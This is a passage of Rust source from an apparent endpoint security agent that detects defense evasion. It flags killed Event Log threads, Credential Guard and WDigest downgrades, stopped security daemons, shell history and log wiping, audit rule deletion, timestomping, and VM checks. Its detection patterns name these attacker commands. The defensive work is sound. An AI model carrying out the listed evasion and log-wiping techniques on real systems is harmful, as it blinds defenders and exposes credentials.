                                    new_value: Some(format!("{} bytes", current_size)),
                                };

                                let event = Self::create_evasion_event(&evasion);
                                if tx.send(event).await.is_err() {
                                    return;
                                }
                            }
                        }

                        evtx_sizes.insert(path.clone(), (current_size, current_modified));
                    }
                    Err(_) => {
                        // File no longer exists - deleted!
                        if evtx_sizes.contains_key(&path) {
                            warn!("EVTX DELETED: {} has been removed!", log_name);

                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::EventLogServiceTamper,
                                pid: 0,
                                process_name: "unknown".to_string(),
                                process_path: String::new(),
                                cmdline: String::new(),
                                user: String::new(),
                                target: path.clone(),
                                details: format!("Critical event log file deleted: {}", log_name),
                                original_value: evtx_sizes
                                    .get(&path)
                                    .map(|(s, _)| format!("{} bytes", s)),
                                new_value: Some("DELETED".to_string()),
                            };

                            evtx_sizes.remove(&path);

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                        }
                    }
                }
            }

            // === 3. Event channel heartbeat check ===
            // Verify that the Security event log is still accepting events.
            // If the service is running but the channel is silent for too long,
            // threads may have been killed inside the service.
            Self::check_event_channel_heartbeat(&tx).await;
        }
    }

    /// Check Event Log service (svchost.exe -k LocalServiceNetworkRestricted) for
    /// thread termination attacks. Phantom and other tools kill individual threads
    /// inside the Event Log service to stop logging without stopping the service.
    #[cfg(target_os = "windows")]
    async fn check_event_log_service(
        tx: &mpsc::Sender<TelemetryEvent>,
        cached_pid: &mut Option<u32>,
        cached_thread_count: &mut Option<u32>,
    ) {
        use sysinfo::System;

        let mut system = System::new();
        system.refresh_processes();

        // Find the Event Log service host process
        let mut eventlog_pid: Option<u32> = None;

        for (pid, process) in system.processes() {
            let name = process.name().to_lowercase();
            let cmdline = process.cmd().join(" ").to_lowercase();

            // Event Log service runs inside svchost with this specific group
            if name.contains("svchost") && cmdline.contains("localservicenetworkrestricted") {
                eventlog_pid = Some(pid.as_u32());
                break;
            }
        }

        if let Some(el_pid) = eventlog_pid {
            // Count threads using ToolHelp
            let thread_count = Self::count_process_threads(el_pid);

            if let Some(count) = thread_count {
                if let Some(prev_count) = *cached_thread_count {
                    // Detect significant thread count decrease (> 2 threads lost)
                    // A decrease of 3+ threads suggests thread-kill attack (Phantom/Invoke-Phant0m)
                    if count + 3 <= prev_count {
                        warn!(
                            "EVENT LOG THREAD KILL: svchost PID {} thread count dropped {} -> {} (lost {} threads)",
                            el_pid, prev_count, count, prev_count - count
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::EventLogServiceTamper,
                            pid: el_pid,
                            process_name: "svchost.exe".to_string(),
                            process_path: "C:\\Windows\\System32\\svchost.exe".to_string(),
                            cmdline: String::new(),
                            user: String::new(),
                            target: "EventLog Service (EvtSvc.dll)".to_string(),
                            details: format!(
                                "Event Log service thread count dropped from {} to {} ({} threads killed). \
                                 Possible Phantom/Invoke-Phant0m attack.",
                                prev_count, count, prev_count - count
                            ),
                            original_value: Some(format!("{} threads", prev_count)),
                            new_value: Some(format!("{} threads", count)),
                        };

                        let event = Self::create_evasion_event(&evasion);
                        let _ = tx.send(event).await;
                    }
                }

                *cached_thread_count = Some(count);
            }

            *cached_pid = Some(el_pid);
        } else {
            // Event Log service not found - might have been stopped
            if cached_pid.is_some() {
                warn!("EVENT LOG SERVICE DISAPPEARED: svchost for EventLog no longer running!");

                let evasion = DefenseEvasionEvent {
                    evasion_type: EvasionType::EventLogServiceTamper,
                    pid: 0,
                    process_name: "unknown".to_string(),
                    process_path: String::new(),
                    cmdline: String::new(),
                    user: String::new(),
                    target: "EventLog Service".to_string(),
                    details: "Windows Event Log service host process no longer running. \
                              Event logging is disabled."
                        .to_string(),
                    original_value: cached_pid.map(|p| format!("PID {}", p)),
                    new_value: Some("NOT RUNNING".to_string()),
                };

                *cached_pid = None;
                *cached_thread_count = None;

                let event = Self::create_evasion_event(&evasion);
                let _ = tx.send(event).await;
            }
        }
    }

    /// Count the number of threads in a given process using ToolHelp snapshot.
    #[cfg(target_os = "windows")]
    fn count_process_threads(pid: u32) -> Option<u32> {
        unsafe {
            use windows::Win32::Foundation::CloseHandle;
            use windows::Win32::System::Diagnostics::ToolHelp::{
                CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD,
                THREADENTRY32,
            };

            let snapshot = match CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0) {
                Ok(h) => h,
                Err(_) => return None,
            };

            let mut entry = THREADENTRY32 {
                dwSize: std::mem::size_of::<THREADENTRY32>() as u32,
                ..Default::default()
            };

            let mut count = 0u32;

            if Thread32First(snapshot, &mut entry).is_ok() {
                loop {
                    if entry.th32OwnerProcessID == pid {
                        count += 1;
                    }
                    if Thread32Next(snapshot, &mut entry).is_err() {
                        break;
                    }
                }
            }

            let _ = CloseHandle(snapshot);
            Some(count)
        }
    }

    /// Check that Security event channel is still receiving events.
    /// Uses the Windows Event Log API to query recent events. If no events
    /// have been written in the expected timeframe, threads may have been killed.
    #[cfg(target_os = "windows")]
    async fn check_event_channel_heartbeat(tx: &mpsc::Sender<TelemetryEvent>) {
        // Use a simple heuristic: check if the Security.evtx file's modification
        // time is stale (more than 5 minutes old). On an active system, Security
        // events are written continuously (logon audits, process audits, etc.).
        let evtx_path = "C:\\Windows\\System32\\winevt\\Logs\\Security.evtx";

        if let Ok(metadata) = std::fs::metadata(evtx_path) {
            if let Ok(modified) = metadata.modified() {
                if let Ok(elapsed) = modified.elapsed() {
                    // If Security.evtx hasn't been modified in 5 minutes on a
                    // system that should be actively logging, flag it.
                    if elapsed.as_secs() > 300 {
                        warn!(
                            "EVENT LOG HEARTBEAT STALE: Security.evtx not modified in {} seconds",
                            elapsed.as_secs()
                        );

                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::EventLogServiceTamper,
                            pid: 0,
                            process_name: "EventLog".to_string(),
                            process_path: String::new(),
                            cmdline: String::new(),
                            user: String::new(),
                            target: "Security Event Channel".to_string(),
                            details: format!(
                                "Security event log has not been written to in {} seconds. \
                                 Event logging may be disrupted.",
                                elapsed.as_secs()
                            ),
                            original_value: None,
                            new_value: Some(format!(
                                "{} seconds since last write",
                                elapsed.as_secs()
                            )),
                        };

                        let event = Self::create_evasion_event(&evasion);
                        let _ = tx.send(event).await;
                    }
                }
            }
        }
    }

    // ==================== Credential Guard Bypass Detection ====================
    //
    // Detects attempts to bypass Credential Guard / VBS (Virtualization-Based Security):
    //   - lsaiso.exe process manipulation (the secure LSA process)
    //   - WDigest authentication downgrade via UseLogonCredential registry key
    //   - Credential Guard disable via registry (DeviceGuard, HypervisorEnforcedCodeIntegrity)
    //   - BCDEdit disabling Hyper-V / VBS
    //
    #[cfg(target_os = "windows")]
    async fn monitor_credential_guard_bypass(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting Credential Guard bypass detection monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // Track lsaiso.exe presence (Credential Guard's secure process)
        let mut lsaiso_present = false;

        // Track whether we've already reported specific findings to avoid duplicates
        let mut reported_wdigest = false;
        let mut reported_cg_disabled = false;

        loop {
            interval.tick().await;

            system.refresh_processes();

            // === 1. Monitor for lsaiso.exe manipulation ===
            // lsaiso.exe is the Isolated LSA process that runs inside VBS.
            // If it disappears while it was previously running, Credential Guard
            // may have been compromised.
            let lsaiso_found = system
                .processes()
                .iter()
                .any(|(_, p)| p.name().to_lowercase() == "lsaiso.exe");

            if lsaiso_present && !lsaiso_found {
                warn!("CREDENTIAL GUARD: lsaiso.exe process disappeared!");

                let evasion = DefenseEvasionEvent {
                    evasion_type: EvasionType::CredentialGuardBypass,
                    pid: 0,
                    process_name: "lsaiso.exe".to_string(),
                    process_path: "C:\\Windows\\System32\\lsaiso.exe".to_string(),
                    cmdline: String::new(),
                    user: String::new(),
                    target: "Credential Guard (lsaiso.exe)".to_string(),
                    details: "Credential Guard's isolated LSA process (lsaiso.exe) has \
                              disappeared. Credentials may no longer be protected by VBS."
                        .to_string(),
                    original_value: Some("running".to_string()),
                    new_value: Some("terminated".to_string()),
                };

                let event = Self::create_evasion_event(&evasion);
                if tx.send(event).await.is_err() {
                    return;
                }
            }

            lsaiso_present = lsaiso_found;

            // === 2. Check for WDigest authentication downgrade ===
            // Setting UseLogonCredential=1 forces Windows to store cleartext passwords
            // in memory, defeating Credential Guard's protection.
            if !reported_wdigest {
                if let Some(details) = Self::check_wdigest_downgrade() {
                    warn!("CREDENTIAL GUARD: WDigest downgrade detected!");

                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::CredentialGuardBypass,
                        pid: 0,
                        process_name: "registry".to_string(),
                        process_path: String::new(),
                        cmdline: String::new(),
                        user: String::new(),
                        target: "WDigest Authentication".to_string(),
                        details,
                        original_value: Some("UseLogonCredential=0 (secure)".to_string()),
                        new_value: Some(
                            "UseLogonCredential=1 (cleartext passwords in memory)".to_string(),
                        ),
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                    reported_wdigest = true;
                }
            }

            // === 3. Check for Credential Guard disable via registry ===
            if !reported_cg_disabled {
                if let Some(details) = Self::check_credential_guard_disabled() {
                    warn!("CREDENTIAL GUARD: VBS/Device Guard disabled via registry!");

                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::CredentialGuardBypass,
                        pid: 0,
                        process_name: "registry".to_string(),
                        process_path: String::new(),
                        cmdline: String::new(),
                        user: String::new(),
                        target: "Device Guard / Credential Guard".to_string(),
                        details,
                        original_value: None,
                        new_value: Some("Credential Guard disabled".to_string()),
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                    reported_cg_disabled = true;
                }
            }

            // === 4. Detect command-line attempts to disable Credential Guard ===
            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // BCDEdit commands to disable VBS / Hyper-V
                if name.contains("bcdedit") {
                    let disable_patterns = [
                        ("hypervisorlaunchtype", "off"),
                        ("vsmlaunchtype", "off"),
                        ("loadoptions", "disable-lsa-iso"),
                    ];

                    for (key, value) in &disable_patterns {
                        if cmdline.contains(key) && cmdline.contains(value) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::CredentialGuardBypass,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: "BCD / Credential Guard".to_string(),
                                details: format!(
                                    "BCDEdit command to disable Credential Guard: {} {}",
                                    key, value
                                ),
                                original_value: None,
                                new_value: Some(cmdline.clone()),
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                        }
                    }
                }

                // reg.exe modifying Credential Guard / Device Guard settings
                if name.contains("reg") && cmdline.contains("deviceguard") {
                    if cmdline.contains("enablevirtualizationbasedsecurity")
                        || cmdline.contains("lsacfgflags")
                    {
                        let evasion = DefenseEvasionEvent {
                            evasion_type: EvasionType::CredentialGuardBypass,
                            pid: pid.as_u32(),
                            process_name: process.name().to_string(),
                            process_path: process
                                .exe()
                                .map(|p| p.to_string_lossy().to_string())
                                .unwrap_or_default(),
                            cmdline: cmdline.clone(),
                            user: String::new(),
                            target: "Device Guard Registry".to_string(),
                            details:
                                "Registry modification to Credential Guard / Device Guard settings"
                                    .to_string(),
                            original_value: None,
                            new_value: Some(cmdline.clone()),
                        };

                        let event = Self::create_evasion_event(&evasion);
                        if tx.send(event).await.is_err() {
                            return;
                        }
                    }
                }
            }
        }
    }

    /// Check if WDigest UseLogonCredential is set to 1 (cleartext passwords in memory).
    #[cfg(target_os = "windows")]
    fn check_wdigest_downgrade() -> Option<String> {
        use winreg::enums::HKEY_LOCAL_MACHINE;
        use winreg::RegKey;

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
        let wdigest_key = hklm
            .open_subkey("SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest")
            .ok()?;

        let use_logon_credential: u32 = wdigest_key.get_value("UseLogonCredential").ok()?;

        if use_logon_credential == 1 {
            Some(
                "WDigest UseLogonCredential is set to 1. Windows will store cleartext \
                 passwords in LSASS memory, bypassing Credential Guard protection. \
                 This is a common credential theft technique (Mimikatz, Sekurlsa)."
                    .to_string(),
            )
        } else {
            None
        }
    }

    /// Check if Credential Guard / VBS has been disabled via registry.
    #[cfg(target_os = "windows")]
    fn check_credential_guard_disabled() -> Option<String> {
        use winreg::enums::HKEY_LOCAL_MACHINE;
        use winreg::RegKey;

        let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);

        // Check EnableVirtualizationBasedSecurity
        if let Ok(dg_key) = hklm.open_subkey("SOFTWARE\\Policies\\Microsoft\\Windows\\DeviceGuard")
        {
            if let Ok(vbs_enabled) = dg_key.get_value::<u32, _>("EnableVirtualizationBasedSecurity")
            {
                if vbs_enabled == 0 {
                    return Some(
                        "DeviceGuard EnableVirtualizationBasedSecurity is set to 0. \
                         Virtualization-Based Security (VBS) and Credential Guard are disabled."
                            .to_string(),
                    );
                }
            }

            // Check LsaCfgFlags (Credential Guard specific)
            // 0 = disabled, 1 = enabled with UEFI lock, 2 = enabled without lock
            if let Ok(lsa_cfg) = dg_key.get_value::<u32, _>("LsaCfgFlags") {
                if lsa_cfg == 0 {
                    return Some(
                        "DeviceGuard LsaCfgFlags is set to 0. Credential Guard \
                         is explicitly disabled via Group Policy."
                            .to_string(),
                    );
                }
            }
        }

        // Check HypervisorEnforcedCodeIntegrity (HVCI)
        if let Ok(ci_key) = hklm.open_subkey(
            "SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity",
        ) {
            if let Ok(enabled) = ci_key.get_value::<u32, _>("Enabled") {
                if enabled == 0 {
                    return Some(
                        "HypervisorEnforcedCodeIntegrity (HVCI) is disabled. \
                         This weakens kernel-mode code integrity enforcement."
                            .to_string(),
                    );
                }
            }
        }

        None
    }

    // ==================== Linux Implementation ====================
    #[cfg(target_os = "linux")]
    async fn linux_monitor_loop(tx: mpsc::Sender<TelemetryEvent>, config: AgentConfig) {
        let mul = config.sub_loop_interval_multiplier;
        let full_scan = config.full_scan_features;
        info!(
            multiplier = mul,
            full_scan = full_scan,
            "Starting Linux defense evasion monitor"
        );

        // Start multiple monitoring tasks
        let tx1 = tx.clone();
        let tx2 = tx.clone();
        let tx3 = tx.clone();
        let tx5 = tx.clone();

        // Security tool tampering monitor (5s base -> scaled by multiplier)
        let security_interval_ms = ((5000.0 * mul) as u64).max(5000);
        tokio::spawn(async move {
            Self::linux_monitor_security_tools(tx1, security_interval_ms).await;
        });

        // Log tampering monitor (5s base -> scaled by multiplier)
        let log_interval_ms = ((5000.0 * mul) as u64).max(5000);
        tokio::spawn(async move {
            Self::linux_monitor_log_tampering(tx2, log_interval_ms).await;
        });

        // Timestomping detection (3s base -> scaled by multiplier)
        let timestomp_interval_ms = ((3000.0 * mul) as u64).max(3000);
        tokio::spawn(async move {
            Self::linux_monitor_timestomping(tx3, timestomp_interval_ms).await;
        });

        // VM/Sandbox evasion detection (full_scan only)
        if full_scan {
            let tx4 = tx.clone();
            let vm_interval_ms = ((5000.0 * mul) as u64).max(5000);
            tokio::spawn(async move {
                Self::linux_monitor_vm_sandbox_evasion(tx4, vm_interval_ms).await;
            });
        } else {
            info!("Skipping linux_vm_sandbox_evasion monitor (full_scan_features=false)");
        }

        // LOLBin / GTFOBin behavioral baselining (5s base -> scaled by multiplier)
        let lolbin_interval_ms = ((5000.0 * mul) as u64).max(5000);
        Self::monitor_lolbin_execution_linux(tx5, lolbin_interval_ms).await;
    }

    #[cfg(target_os = "linux")]
    async fn linux_monitor_security_tools(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting Linux security tool monitor");

        // Security processes to monitor
        let security_processes: HashSet<&str> = [
            "auditd",
            "osqueryd",
            "falcond",
            "falcon-sensor",
            "elastic-agent",
            "elastic-endpoint",
            "filebeat",
            "metricbeat",
            "clamd",
            "freshclam",
            "aide",
            "tripwire",
            "ossec",
            "wazuh",
            "snort",
            "suricata",
            "rsyslogd",
            "syslog-ng",
        ]
        .iter()
        .cloned()
        .collect();

        let mut system = System::new_all();
        let mut known_security_pids: HashSet<u32> = HashSet::new();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Track current security process PIDs
            let current_security_pids: HashSet<u32> = system
                .processes()
                .iter()
                .filter(|(_, proc)| {
                    let name = proc.name().to_lowercase();
                    security_processes.iter().any(|sp| name.contains(sp))
                })
                .map(|(pid, _)| pid.as_u32())
                .collect();

            // Detect terminated security processes
            for pid in known_security_pids.difference(&current_security_pids) {
                let evasion = DefenseEvasionEvent {
                    evasion_type: EvasionType::SecurityToolTampering,
                    pid: 0,
                    process_name: "unknown".to_string(),
                    process_path: String::new(),
                    cmdline: String::new(),
                    user: String::new(),
                    target: format!("Security process PID {}", pid),
                    details: "Security tool process terminated unexpectedly".to_string(),
                    original_value: None,
                    new_value: None,
                };

                let event = Self::create_evasion_event(&evasion);
                if tx.send(event).await.is_err() {
                    return;
                }
            }

            known_security_pids = current_security_pids;

            // Check for processes attempting to stop security services
            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for systemctl/service stopping security services
                if name.contains("systemctl") || name.contains("service") {
                    if cmdline.contains("stop") || cmdline.contains("disable") {
                        for sp in &security_processes {
                            if cmdline.contains(sp) {
                                let evasion = DefenseEvasionEvent {
                                    evasion_type: EvasionType::SecurityToolTampering,
                                    pid: pid.as_u32(),
                                    process_name: process.name().to_string(),
                                    process_path: process
                                        .exe()
                                        .map(|p| p.to_string_lossy().to_string())
                                        .unwrap_or_default(),
                                    cmdline: cmdline.clone(),
                                    user: String::new(),
                                    target: sp.to_string(),
                                    details: format!(
                                        "Attempt to stop/disable security service: {}",
                                        sp
                                    ),
                                    original_value: None,
                                    new_value: None,
                                };

                                let event = Self::create_evasion_event(&evasion);
                                if tx.send(event).await.is_err() {
                                    return;
                                }
                            }
                        }
                    }
                }

                // Check for kill/pkill targeting security processes
                if name.contains("kill") || name.contains("pkill") || name.contains("killall") {
                    for sp in &security_processes {
                        if cmdline.contains(sp) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::SecurityToolTampering,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: sp.to_string(),
                                details: format!("Attempt to kill security process: {}", sp),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                        }
                    }
                }

                // Check for unloading kernel modules (potential EDR bypass)
                if name.contains("rmmod") || name.contains("modprobe") && cmdline.contains("-r") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::DriverUnload,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "Kernel module".to_string(),
                        details: "Kernel module unload detected".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    async fn linux_monitor_log_tampering(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use std::collections::HashMap;
        use std::fs;
        use sysinfo::System;

        info!("Starting Linux log tampering monitor");

        // Log files to monitor
        let log_files = vec![
            "/var/log/auth.log",
            "/var/log/secure",
            "/var/log/syslog",
            "/var/log/messages",
            "/var/log/audit/audit.log",
            "/var/log/wtmp",
            "/var/log/btmp",
            "/var/log/lastlog",
            "/var/run/utmp",
            "~/.bash_history",
        ];

        // Track file sizes for truncation detection
        let mut file_sizes: HashMap<String, u64> = HashMap::new();

        // Initialize file sizes
        for path in &log_files {
            if let Ok(metadata) = fs::metadata(path) {
                file_sizes.insert(path.to_string(), metadata.len());
            }
        }

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Check for log manipulation commands
            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for history clearing
                if cmdline.contains("history -c")
                    || cmdline.contains("history -w")
                    || cmdline.contains("unset histfile")
                    || cmdline.contains("export histsize=0")
                    || cmdline.contains("shred") && cmdline.contains("history")
                {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::ArtifactDeletion,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "bash_history".to_string(),
                        details: "Shell history clearing detected".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for log file manipulation
                for log_path in &log_files {
                    if cmdline.contains(log_path) {
                        if cmdline.contains("truncate")
                            || cmdline.contains("> ")
                            || cmdline.contains("shred")
                            || cmdline.contains("rm ")
                            || cmdline.contains("unlink")
                        {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::EventLogClearing,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: log_path.to_string(),
                                details: format!("Log file manipulation: {}", log_path),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                        }
                    }
                }

                // Check for journalctl --vacuum
                if name.contains("journalctl") && cmdline.contains("vacuum") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::EventLogClearing,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "systemd journal".to_string(),
                        details: "Journal vacuum operation detected".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for auditctl -D (delete all audit rules)
                if name.contains("auditctl") && cmdline.contains("-d") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::AuditPolicyModified,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "auditd".to_string(),
                        details: "Audit rules deletion detected".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }
            }

            // Check for log file size decreases (truncation)
            for path in &log_files {
                if let Ok(metadata) = fs::metadata(path) {
                    let current_size = metadata.len();
                    if let Some(&prev_size) = file_sizes.get(*path) {
                        // Size decreased significantly (more than 10%)
                        if current_size < prev_size && (prev_size - current_size) > prev_size / 10 {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::EventLogClearing,
                                pid: 0,
                                process_name: "unknown".to_string(),
                                process_path: String::new(),
                                cmdline: String::new(),
                                user: String::new(),
                                target: path.to_string(),
                                details: "Log file truncation detected".to_string(),
                                original_value: Some(format!("{} bytes", prev_size)),
                                new_value: Some(format!("{} bytes", current_size)),
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                        }
                    }
                    file_sizes.insert(path.to_string(), current_size);
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    async fn linux_monitor_timestomping(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting Linux timestomping detection monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        loop {
            interval.tick().await;

            system.refresh_processes();

            // Check for touch with timestamp manipulation
            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for touch -t or touch -d (setting specific timestamps)
                if name.contains("touch")
                    && (cmdline.contains("-t")
                        || cmdline.contains("-d")
                        || cmdline.contains("--date"))
                {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::Timestomping,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "file timestamps".to_string(),
                        details: "Timestamp manipulation via touch command".to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }

                // Check for debugfs access (can modify inode timestamps)
                if name.contains("debugfs") {
                    let evasion = DefenseEvasionEvent {
                        evasion_type: EvasionType::Timestomping,
                        pid: pid.as_u32(),
                        process_name: process.name().to_string(),
                        process_path: process
                            .exe()
                            .map(|p| p.to_string_lossy().to_string())
                            .unwrap_or_default(),
                        cmdline: cmdline.clone(),
                        user: String::new(),
                        target: "filesystem".to_string(),
                        details: "debugfs access detected - potential timestamp/inode manipulation"
                            .to_string(),
                        original_value: None,
                        new_value: None,
                    };

                    let event = Self::create_evasion_event(&evasion);
                    if tx.send(event).await.is_err() {
                        return;
                    }
                }
            }
        }
    }

    #[cfg(target_os = "linux")]
    async fn linux_monitor_vm_sandbox_evasion(tx: mpsc::Sender<TelemetryEvent>, interval_ms: u64) {
        use sysinfo::System;

        info!("Starting Linux VM/sandbox evasion detection monitor");

        let mut system = System::new_all();
        let mut interval = tokio::time::interval(tokio::time::Duration::from_millis(interval_ms));

        // VM detection indicators
        let vm_indicators = [
            "vmware",
            "virtualbox",
            "vbox",
            "qemu",
            "xen",
            "hyperv",
            "kvm",
            "bhyve",
            "parallels",
        ];

        // Analysis tools
        // NOTE: These are legitimate development and security tools. Detections
        // from this list should be treated as informational/low severity only,
        // not as alerts. They indicate potential anti-analysis behavior by
        // OTHER processes checking for these tools.
        let analysis_tools = [
            "strace",
            "ltrace",
            "gdb",
            "lldb",
            "ida",
            "ghidra",
            "radare2",
            "r2",
            "objdump",
            "tcpdump",
            "wireshark",
            "tshark",
        ];

        loop {
            interval.tick().await;

            system.refresh_processes();

            for (pid, process) in system.processes() {
                let cmdline = process.cmd().join(" ").to_lowercase();
                let name = process.name().to_lowercase();

                // Check for VM detection attempts
                // Reading DMI/SMBIOS data
                if cmdline.contains("/sys/class/dmi")
                    || cmdline.contains("/sys/firmware")
                    || cmdline.contains("dmidecode")
                {
                    for indicator in &vm_indicators {
                        if cmdline.contains(indicator) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::VmDetection,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: indicator.to_string(),
                                details: format!(
                                    "VM detection attempt: checking for {}",
                                    indicator
                                ),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                            break;
                        }
                    }
                }

                // Check for lspci/lsmod checking for VM drivers
                if name.contains("lspci") || name.contains("lsmod") || name.contains("lshw") {
                    for indicator in &vm_indicators {
                        if cmdline.contains(indicator) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::VmDetection,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: indicator.to_string(),
                                details: format!(
                                    "VM detection via hardware enumeration: {}",
                                    indicator
                                ),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                            break;
                        }
                    }
                }

                // Check for analysis tool detection
                if name.contains("ps") || name.contains("pgrep") {
                    for tool in &analysis_tools {
                        if cmdline.contains(tool) {
                            let evasion = DefenseEvasionEvent {
                                evasion_type: EvasionType::AnalysisToolDetection,
                                pid: pid.as_u32(),
                                process_name: process.name().to_string(),
                                process_path: process
                                    .exe()
                                    .map(|p| p.to_string_lossy().to_string())
                                    .unwrap_or_default(),
                                cmdline: cmdline.clone(),
                                user: String::new(),
                                target: tool.to_string(),
                                details: format!(
                                    "Analysis tool detection attempt: checking for {}",
                                    tool
                                ),
                                original_value: None,
                                new_value: None,
                            };

                            let event = Self::create_evasion_event(&evasion);
                            if tx.send(event).await.is_err() {
                                return;
                            }
                            break;
                        }
                    }
                }

                // Check for /proc/self/status TracerPid check (debugger detection)
